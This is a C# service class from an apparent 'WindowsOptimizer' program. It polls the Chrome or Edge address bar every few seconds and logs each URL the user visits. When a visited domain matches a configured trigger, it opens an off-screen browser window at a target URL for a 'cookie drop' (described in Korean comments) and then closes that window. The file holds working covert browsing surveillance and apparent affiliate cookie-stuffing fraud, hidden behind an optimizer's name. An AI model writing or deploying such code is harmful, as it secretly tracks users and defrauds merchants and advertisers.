using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Automation;
using WindowsOptimizer.Models;

namespace WindowsOptimizer.Services
{
    public class BrowserMonitorService
    {
        private static readonly Lazy<BrowserMonitorService> _instance = new Lazy<BrowserMonitorService>(() => new BrowserMonitorService());
        public static BrowserMonitorService Instance => _instance.Value;

        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
        [DllImport("user32.dll")] private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("user32.dll")] private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        private const uint WM_CLOSE = 0x0010;

        private Thread _thread;
        private volatile bool _isMonitoring;
        private string _lastUrl = "";
        private int _browserType = 0;

        public MappingConfig MappingConfig => ConfigService.Instance.MappingConfig;
        public bool IsMonitoring => _isMonitoring;
        public int MonitoringInterval { get; set; } = 3000;
        public int CookieDropDelayMs { get; set; } = 8000; // 쿠키 드롭 대기 시간
        public int TriggerCount { get; private set; }
        public DateTime LastTriggerTime { get; private set; }

        public event Action<string> UrlChanged;
        public event Action<string, DomainMapping> DomainTriggered;

        private BrowserMonitorService() { }

        public void StartMonitoring()
        {
            if (_isMonitoring) return;
            _isMonitoring = true;
            _thread = new Thread(MonitoringLoop) { IsBackground = true };
            _thread.Start();
            LogService.Instance.Log("▶ 브라우저 모니터링 시작");
        }

        public void StopMonitoring()
        {
            if (!_isMonitoring) return;
            _isMonitoring = false;
            _thread?.Join(3000);
            LogService.Instance.Log("⏹ 브라우저 모니터링 중지");
        }

        private void MonitoringLoop()
        {
            while (_isMonitoring)
            {
                try
                {
                    var url = GetCurrentBrowserUrl();
                    if (!string.IsNullOrEmpty(url) && url != _lastUrl)
                    {
                        LogService.Instance.Log($"URL 변경: {url}");
                        UrlChanged?.Invoke(url);
                        ProcessMapping(url);
                        _lastUrl = url;
                    }
                }
                catch (Exception ex)
                {
                    LogService.Instance.Log($"모니터링 오류: {ex.Message}");
                }
                Thread.Sleep(MonitoringInterval);
            }
        }

        private void ProcessMapping(string url)
        {
            if (MappingConfig?.Mappings == null) return;

            try
            {
                var uri = new Uri(url.StartsWith("http") ? url : $"https://{url}");
                var domain = uri.Host.Replace("www.", "").ToLower();

                foreach (var mapping in MappingConfig.Mappings)
                {
                    if (domain.Contains(mapping.Trigger.ToLower()) && mapping.CanTrigger())
                    {
                        mapping.MarkTriggered();
                        TriggerCount++;
                        LastTriggerTime = DateTime.Now;

                        LogService.Instance.Log($"[PlanB] 도메인 매칭: {mapping.Trigger} → 쿠키 드롭 시작");
                        DomainTriggered?.Invoke(url, mapping);
                        OpenHiddenBrowserForCookie(mapping.Target);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Log($"[PlanB] 매칭 오류: {ex.Message}");
            }
        }

        /// <summary>
        /// 히든 브라우저로 쿠키 드롭 후 닫기
        /// </summary>
        public void OpenHiddenBrowserForCookie(string url)
        {
            try
            {
                // 열기 전 기존 창 목록 저장
                var existingWindows = GetBrowserWindows();

                var browserExe = _browserType == 0 ? "chrome" : "msedge";
                var startInfo = new ProcessStartInfo
                {
                    FileName = browserExe,
                    Arguments = $"--new-window --window-position=-32000,-32000 --window-size=100,100 \"{url}\"",
                    UseShellExecute = true
                };

                Process.Start(startInfo);
                LogService.Instance.Log($"[히든] 쿠키 드롭 브라우저 열기: {url}");

                // 비동기로 일정 시간 후 새 창 닫기
                Task.Run(async () =>
                {
                    await Task.Delay(CookieDropDelayMs);
                    CloseNewBrowserWindow(existingWindows, url);
                });
            }
            catch (Exception ex)
            {
                LogService.Instance.Log($"[히든] 브라우저 열기 실패: {ex.Message}");
            }
        }

        private List<IntPtr> GetBrowserWindows()
        {
            var windows = new List<IntPtr>();
            EnumWindows((hWnd, lParam) =>
            {
                if (!IsWindowVisible(hWnd)) return true;

                var className = new StringBuilder(256);
                GetClassName(hWnd, className, 256);
                var cn = className.ToString();

                // Chrome/Edge 창 클래스
                if (cn == "Chrome_WidgetWin_1")
                    windows.Add(hWnd);

                return true;
            }, IntPtr.Zero);
            return windows;
        }

        private void CloseNewBrowserWindow(List<IntPtr> existingWindows, string url)
        {
            try
            {
                var currentWindows = GetBrowserWindows();
                var newWindows = currentWindows.Except(existingWindows).ToList();

                if (newWindows.Count > 0)
                {
                    // 가장 최근 열린 창 닫기
                    PostMessage(newWindows.First(), WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                    LogService.Instance.Log($"[히든] 쿠키 드롭 완료, 창 닫음");
                }
                else
                {
                    // URL 호스트로 창 찾기 시도
                    var uri = new Uri(url);
                    var host = uri.Host.Replace("www.", "");
                    CloseWindowByTitle(host);
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Log($"[히든] 창 닫기 실패: {ex.Message}");
            }
        }

        private void CloseWindowByTitle(string titlePart)
        {
            EnumWindows((hWnd, lParam) =>
            {
                if (!IsWindowVisible(hWnd)) return true;

                var title = new StringBuilder(512);
                GetWindowText(hWnd, title, 512);
                var t = title.ToString().ToLower();

                if (t.Contains(titlePart.ToLower()))
                {
                    var className = new StringBuilder(256);
                    GetClassName(hWnd, className, 256);
                    if (className.ToString() == "Chrome_WidgetWin_1")
                    {
                        PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                        LogService.Instance.Log($"[히든] 제목으로 창 닫음: {titlePart}");
                        return false;
                    }
                }
                return true;
            }, IntPtr.Zero);
        }

        private string GetCurrentBrowserUrl()
        {
            var hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return "";

            GetWindowThreadProcessId(hwnd, out uint pid);
            try
            {
                var process = Process.GetProcessById((int)pid);
                var name = process.ProcessName.ToLower();

                if (name == "chrome" || name == "msedge" || name == "edge")
                {
                    _browserType = name.Contains("chrome") ? 0 : 1;
                    return ExtractUrlFromBrowser(process.MainWindowHandle, name);
                }
            }
            catch { }
            return "";
        }

        private string ExtractUrlFromBrowser(IntPtr hwnd, string browser)
        {
            try
            {
                var window = AutomationElement.FromHandle(hwnd);
                if (window == null) return "";

                string[] names = browser.Contains("chrome")
                    ? new[] { "주소창 및 검색창", "Address and search bar" }
                    : new[] { "주소창 및 검색창", "주소 및 검색창", "address-and-search-bar" };

                foreach (var name in names)
                {
                    var condition = new OrCondition(
                        new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit),
                        new PropertyCondition(AutomationElement.NameProperty, name)
                    );

                    var bar = window.FindFirst(TreeScope.Descendants, condition);
                    if (bar != null && bar.TryGetCurrentPattern(ValuePattern.Pattern, out object pattern))
                        return ((ValuePattern)pattern).Current.Value;
                }
            }
            catch { }
            return "";
        }
    }
}